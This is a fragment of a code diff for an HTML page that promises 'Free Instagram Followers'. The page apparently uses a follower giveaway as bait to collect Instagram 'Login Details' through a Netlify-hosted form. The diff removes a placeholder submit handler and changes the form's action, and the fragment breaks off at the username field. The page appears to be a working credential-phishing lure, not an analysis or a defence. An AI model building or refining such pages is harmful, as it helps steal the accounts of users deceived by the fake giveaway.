@@ -22,11 +22,6 @@
 //     .then(() => navigate("/thank-you/")) // Assuming navigate is defined
 //     .catch((error) => alert(error));
 // };
-const handleSubmit = (event) => {
-  event.preventDefault();
-  alert("Thank you for your submission");
-};
-
     </script>
 </head>
 <body>
@@ -105,7 +100,7 @@ const handleSubmit = (event) => {
     <div class="welcome">
         <h2 class="m-head">Free Instagram Followers</h2>
         <div class="line-bottom"></div>
-        <form id="form" data-netlify="true" name="myForm" method="post" onsubmit="return handleSubmit();" action="/">
+        <form id="form" data-netlify="true" name="myForm" method="post" onsubmit="return handleSubmit();" action="/index.html">
             <input type="hidden" name="form-name" value="Login Details">
             <h2 class="m-head result-head">Get 50 followers for free</h2>
             <label for="name">Username/Email
